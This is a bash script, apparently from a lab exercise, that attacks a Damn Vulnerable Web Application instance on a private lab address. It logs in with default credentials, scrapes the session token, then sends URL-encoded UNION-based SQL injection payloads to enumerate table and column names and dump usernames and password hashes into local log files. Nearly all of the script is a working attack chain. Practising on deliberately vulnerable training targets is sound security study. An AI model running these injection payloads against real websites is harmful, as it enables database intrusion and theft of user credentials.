#!/bin/bash

SECURITY="low" #security level
USER="admin" #username
PASS="password" #password

rm cookies.txt #removes old file with cookies

#saves login cookies and login page html to local files
curl -s -c cookies.txt \
  -b "security=$SECURITY" \
  http://192.168.56.105/DVWA/login.php \
  >login.html

TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login.html) #saves user token variable found in login html
PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt) #saves PHP session ID found in cookies

#logs in using cookies and user token
curl -s -b cookies.txt \
  -b "security=$SECURITY" \
  -d "username=$USER&password=$PASS&user_token=$TOKEN&Login=Login" \
  http://192.168.56.105/DVWA/login.php


#saves result of table name retrieval to local log file
{
echo "Security level: $SECURITY"
echo "Attempting to retrieve table names..."
echo "---------------------------------------------------"
RESPONSE=$(curl -s \
  -b "PHPSESSID=$PHPSESSID; security=low" \
  "http://192.168.56.105/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20SELECT%20table_name%2C%20NULL%20%20FROM%20information_schema.tables%20%20WHERE%20table_schema%20%3D%20database%28%29%23&Submit=Submit")
echo "$RESPONSE" | grep -oP 'First name: \K[^<]+' #Removes header (First name:) from result
}> /home/kali/sqli_low1.log

#saves result of column name retrieval to local log file
{
echo "Security level: $SECURITY"
echo "Attempting to retrieve column names..."
echo "---------------------------------------------------"
RESPONSE=$(curl -s \
  -b "PHPSESSID=$PHPSESSID; security=low" \
  "http://192.168.56.105/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20SELECT%20column_name%2C%20NULL%20%20FROM%20information_schema.columns%20%20WHERE%20table_name%20%3D%20%27users%27%23&Submit=Submit")
echo "$RESPONSE" | grep -oP 'First name: \K[^<]+' #Removes header (First name:) from result
}> /home/kali/sqli_low2.log

#saves result of credential retrieval to local log file
{
echo "Security level: $SECURITY"
echo "Attempting to retrieve credentials..."
echo "---------------------------------------------------"
RESPONSE=$(curl -s \
  -b "PHPSESSID=$PHPSESSID; security=low" \
  "http://192.168.56.105/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20SELECT%20user%2C%20password%20FROM%20users%23&Submit=Submit")
echo "$RESPONSE" | grep -oP 'First name: \K[^<]+|Surname: \K[^<]+' | paste - - #Removes header (First name:) from result. Returns username and password on the same line
}> /home/kali/sqli_low3.log
